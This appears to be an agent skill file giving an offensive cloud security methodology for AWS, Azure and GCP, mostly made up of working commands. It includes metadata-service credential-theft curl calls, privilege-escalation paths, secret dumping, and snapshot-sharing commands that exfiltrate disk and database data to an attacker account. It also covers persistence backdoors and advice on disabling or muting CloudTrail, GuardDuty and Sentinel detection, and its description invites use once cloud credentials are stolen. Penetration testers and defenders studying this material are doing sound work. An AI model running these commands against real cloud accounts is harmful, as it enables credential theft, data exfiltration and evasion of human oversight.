---
name: offensive-cloud
description: Cloud security attack methodology covering AWS, Azure, and GCP. Includes
  credential harvesting (IMDS, ~/.aws, env vars, leaked CI secrets, instance roles),
  enumeration with cloud-specific tools (pacu, ScoutSuite, Prowler, ROADtools, gcp_enum),
  privilege escalation paths (IAM PassRole, AssumeRole chains, Lambda/Functions privilege
  flips, Azure Owner-on-self, GCP serviceAccountTokenCreator), persistence techniques
  (IAM user/key creation, AAD app registration, GCP svc account key creation, EventBridge/Logic
  Apps backdoors), data exfiltration (S3/Blob/GCS, snapshot share, RDS/CosmosDB/Cloud
  SQL exfil), cloud-native lateral movement (cross-account assume, Azure AD multi-tenant,
  GCP project hierarchy), serverless attacks (Lambda env vars, layer hijack, Step
  Functions), Kubernetes-on-cloud (EKS/AKS/GKE-specific paths to node and AWS metadata),
  and CSPM evasion (CloudTrail blind spots, GuardDuty mute, Sentinel rule shaping).
  Use when the engagement scope is cloud accounts, when you've stolen cloud credentials,
  or…
metadata:
  description_full: Cloud security attack methodology covering AWS, Azure, and GCP.
    Includes credential harvesting (IMDS, ~/.aws, env vars, leaked CI secrets, instance
    roles), enumeration with cloud-specific tools (pacu, ScoutSuite, Prowler, ROADtools,
    gcp_enum), privilege escalation paths (IAM PassRole, AssumeRole chains, Lambda/Functions
    privilege flips, Azure Owner-on-self, GCP serviceAccountTokenCreator), persistence
    techniques (IAM user/key creation, AAD app registration, GCP svc account key creation,
    EventBridge/Logic Apps backdoors), data exfiltration (S3/Blob/GCS, snapshot share,
    RDS/CosmosDB/Cloud SQL exfil), cloud-native lateral movement (cross-account assume,
    Azure AD multi-tenant, GCP project hierarchy), serverless attacks (Lambda env
    vars, layer hijack, Step Functions), Kubernetes-on-cloud (EKS/AKS/GKE-specific
    paths to node and AWS metadata), and CSPM evasion (CloudTrail blind spots, GuardDuty
    mute, Sentinel rule shaping). Use when the engagement scope is cloud accounts,
    when you've stolen cloud credentials, or when assessing cloud posture.
---

# Cloud (AWS / Azure / GCP) — Offensive Testing Methodology

## Quick Workflow

1. Identify the cloud and the identity context you have (user, role, service account, instance role)
2. Enumerate without writes — `aws sts get-caller-identity`, `az account show`, `gcloud auth list`
3. Map permissions to known privilege-escalation primitives (PassRole, Owner, etc.)
4. Find the data and the persistence anchors before alarms fire
5. Document the kill chain with timestamps, identities, and resources for the report

---

## AWS

### Identity Discovery

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $NF}')
aws iam list-attached-role-policies --role-name <role>
aws iam simulate-principal-policy --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names "*"
```

### IMDS Credential Theft

```bash
# IMDSv1 (legacy)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# IMDSv2 (modern, requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

From SSRF, IMDSv2 was historically reachable when the SSRF allowed setting custom headers. Modern AWS denies SSRF without `Host: 169.254.169.254` and proper `PUT`-then-`GET` flow — SSRF in 2024+ rarely yields IMDSv2 unless the proxy reflects custom headers.

### Privilege Escalation Paths

| Path | Required Permission | Outcome |
|------|---------------------|---------|
| `iam:PassRole` + `lambda:CreateFunction` | Pass any role to Lambda you create | Run code as that role |
| `iam:PassRole` + `ec2:RunInstances` | Pass any role to EC2 instance | IMDS → role creds |
| `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion` | Edit your own policy | Self-elevate |
| `iam:UpdateAssumeRolePolicy` | On a privileged role | Add yourself as principal |
| `iam:CreateLoginProfile` (on user without one) | Set console password | Console access |
| `iam:CreateAccessKey` (on another user) | Mint keys for someone else | Persistent access |
| `sts:AssumeRole` with `sts:TagSession` to ABAC role | If role trusts session tags | Tag-based escalation |
| `cloudformation:CreateStack` + permissive role | Run any service action | Indirect arbitrary perms |
| `glue:UpdateDevEndpoint` | Inject SSH key into Glue endpoint | Code exec as Glue role |
| `ssm:SendCommand` to any instance | RCE on instances + their roles | Lateral + escalation |

```bash
# Pacu — the tooling for AWS escalation
pacu
> import_keys default
> run iam__enum_permissions
> run iam__privesc_scan
```

### Cross-Account / Organization

```bash
# Find roles trusting the current account
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument!=null]'
# Then grep AssumeRolePolicyDocument.Statement for trusts to your account

# Org-wide (if Organizations access)
aws organizations list-accounts
aws organizations list-roots
```

### Data Targets

```bash
# S3
aws s3api list-buckets
aws s3 ls s3://<bucket> --recursive | head
aws s3api get-bucket-policy --bucket <bucket>

# Cross-region snapshot share (data exfil without S3)
aws ec2 modify-snapshot-attribute --snapshot-id snap-... \
  --attribute createVolumePermission \
  --create-volume-permission "Add=[{UserId=ATTACKER_ACCT}]"

# RDS snapshot share
aws rds modify-db-snapshot-attribute --db-snapshot-identifier mysnap \
  --attribute-name restore --values-to-add ATTACKER_ACCT

# Secrets Manager / Parameter Store
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path / --recursive --with-decryption
```

### Persistence

```bash
# Cross-account SCP exemption via service-linked role
# AWS Config snapshot delivery channel rerouted to attacker bucket
aws configservice put-delivery-channel ...  # Rare but devastating

# EventBridge rule firing Lambda you control on every IAM change
# Backdoor: Lambda creates an access key for any new admin user
```

### Detection Evasion

- CloudTrail to multi-region with log file validation — disable validation if you have perms
- GuardDuty findings can be muted via `update-findings-feedback` if you have the permission (rare in prod)
- VPC Flow Logs only catch IP traffic; control-plane API calls are CloudTrail-only

---

## Azure

### Identity Discovery

```bash
az account show
az ad signed-in-user show
az role assignment list --all --assignee $(az ad signed-in-user show --query id -o tsv)

# Microsoft Graph
az rest --method GET --uri "https://graph.microsoft.com/v1.0/me"
```

### IMDS

```bash
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Privilege Escalation Paths

| Path | Required Role / Permission | Outcome |
|------|---------------------------|---------|
| User Access Administrator on self/sub | Grant self Owner | Subscription Owner |
| App Registration owner | Add cert/secret, mint app-only tokens | App's permissions |
| Virtual Machine Contributor + Reader on KV | Run command on VM with MSI → KV | Secrets |
| Custom role with `*/write` on RBAC | Edit role assignments | Self-elevate |
| Logic App contributor | Edit workflow → privileged action | Indirect any action |
| Automation Account contributor | RunBook with Run-As account | Run as RunAs identity |
| AAD `Application Administrator` | Assign app to high-priv role | Cloud admin via app |
| AAD `Cloud Application Administrator` | Same minus on-prem | Cloud admin |
| AAD `Directory Synchronization Account` | DCSync via AAD Connect | All on-prem hashes |
| Privileged Authentication Administrator | Reset MFA / passwords for Globals | Global Admin reset |

```bash
# ROADtools — the AAD enumeration toolkit
roadrecon auth -u user@tenant -p pass
roadrecon gather
roadrecon gui  # browse the gathered DB

# AzureHound for BloodHound integration
azurehound list -u user -p pass --tenant tenant.onmicrosoft.com
```

### Data Targets

```bash
# Storage account access keys (gold)
az storage account keys list -g RG -n SA

# Key Vault (per RBAC + access policies)
az keyvault secret list --vault-name myvault
az keyvault secret show --vault-name myvault -n cred

# Cosmos DB primary keys
az cosmosdb keys list -g RG -n acct

# SQL admin reset
az sql server ad-admin create -g RG -s server -u attacker@tenant -i <obj-id>
```

### Persistence

```bash
# Add cert to existing privileged AAD application
az ad app credential reset --id <app-id> --append

# Conditional Access bypass: add own service principal to "trusted locations" / exclusions
# Custom rules to AAD Audit log retention
```

### Detection Evasion

- AAD Audit Log: tenant-level, can't be tampered with from below Global Admin
- Microsoft Sentinel: rule shaping if you have Workbook / Analytics Rule write
- Defender for Cloud: alert suppression rules

---

## GCP

### Identity Discovery

```bash
gcloud auth list
gcloud projects list
gcloud iam service-accounts list
gcloud projects get-iam-policy $(gcloud config get-value project)
```

### IMDS

```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Privilege Escalation Paths

| Path | Required Permission | Outcome |
|------|---------------------|---------|
| `iam.serviceAccountTokenCreator` on SA | Mint tokens as SA | SA's perms |
| `iam.serviceAccountUser` + `compute.instances.create` | Pass SA to new VM | Run as SA via IMDS |
| `iam.serviceAccountKeyAdmin` | Create JSON key for any SA | Persistent SA creds |
| `cloudbuild.builds.create` | Build runs as Cloud Build SA (often Editor) | Editor on project |
| `deploymentmanager.deployments.create` | Runs as DM SA (often Owner) | Owner |
| `cloudfunctions.functions.create` + actAs | Pass any SA to function | Run as that SA |
| `dataflow.jobs.create` + actAs | Same pattern | SA's perms |
| `iam.roles.update` (custom roles) | Add permissions to a role you have | Self-elevate |
| `resourcemanager.projects.setIamPolicy` | Grant self any role | Owner |

```bash
# gcp_enum / gcp_scanner
git clone https://github.com/google/gcp_scanner
python gcp_scanner.py -k gcp.json -o out/

# Hunt for SA impersonation paths
gcloud iam service-accounts get-iam-policy <sa-email>
# Look for ServiceAccountTokenCreator on something you control
```

### Data Targets

```bash
# GCS buckets
gcloud storage ls
gsutil ls -L gs://bucket
gsutil iam get gs://bucket

# Cloud SQL
gcloud sql instances list
gcloud sql users list --instance <instance>

# Secret Manager
gcloud secrets list
gcloud secrets versions access latest --secret=<name>
```

### Cross-Project / Folder Pivot

```bash
# Org-level perms?
gcloud organizations list
gcloud resource-manager folders list --organization <id>
gcloud projects list --filter="parent.id=<folder-id>"
```

---

## Cross-Cloud Patterns

### CI/CD as the Pivot

Most cloud takeovers in 2024-2025 start with CI tokens:
- GitHub Actions OIDC misconfigured → assume any AWS role with weak `sub` claim
- GitLab CI pushed to wrong branch → gains prod role
- Jenkins agent with cloud credentials in env

Test the OIDC trust policy claims carefully:

```json
"Condition": {
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:org/*"
  }
}
```

### Snapshot Sideways (works on all 3)

Take a snapshot of a victim VM/disk → share or mount it under a controlled account → extract data offline. Bypasses host-level guardrails.

### Secrets-in-Logs

CloudTrail / Activity Log / Cloud Audit Logs sometimes log request bodies. Look for SaaS integrations that POST API keys — they may end up in audit logs.

### Container Registry Poisoning

ECR/ACR/Artifact Registry — if you have push perms on a tag in use by production, replace the image. Tag mutability is the bug.

---

## Tooling Matrix

| Tool | AWS | Azure | GCP | Use |
|------|-----|-------|-----|-----|
| ScoutSuite | ✓ | ✓ | ✓ | Posture audit |
| Prowler | ✓ | ✓ | ✓ | CIS/PCI checks |
| Pacu | ✓ |   |   | Offensive framework |
| CloudGoat | ✓ |   |   | Vulnerable lab |
| BloodHound + AzureHound |   | ✓ |   | Graph-based escalation |
| ROADtools |   | ✓ |   | AAD recon + offline analysis |
| MicroBurst |   | ✓ |   | PS-based offensive |
| Stormspotter |   | ✓ |   | MS' own offensive enum |
| gcp_scanner |   |   | ✓ | Token-based recon |
| GCPBucketBrute |   |   | ✓ | GCS bucket discovery |

---

## Engagement Cheatsheet

```
[ ] sts/get-caller-identity, az account show, gcloud auth list
[ ] Enumerate effective permissions (simulate-principal-policy / get-iam-policy)
[ ] Map known privesc paths against current perms
[ ] Pacu/ROADtools/gcp_scanner full enumeration
[ ] Identify data crown jewels (S3/Blob/GCS, KV, secrets)
[ ] Test cross-account/tenant/project trust paths
[ ] Test CI/CD OIDC trust policies
[ ] Test backup/snapshot exfiltration paths
[ ] Document discovered identities, paths, and data with timestamps
[ ] Persistence demonstrated only with explicit authorization
```

---

## Key References

- AWS IAM permissions reference (boto3 docs)
- Azure RBAC built-in roles + actions list
- GCP IAM permissions reference
- HackTricks Cloud — ongoing reference for newest paths
- "Pacu" framework docs — pacu.aws.cloud
- MITRE ATT&CK Cloud Matrix
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/cloud.md
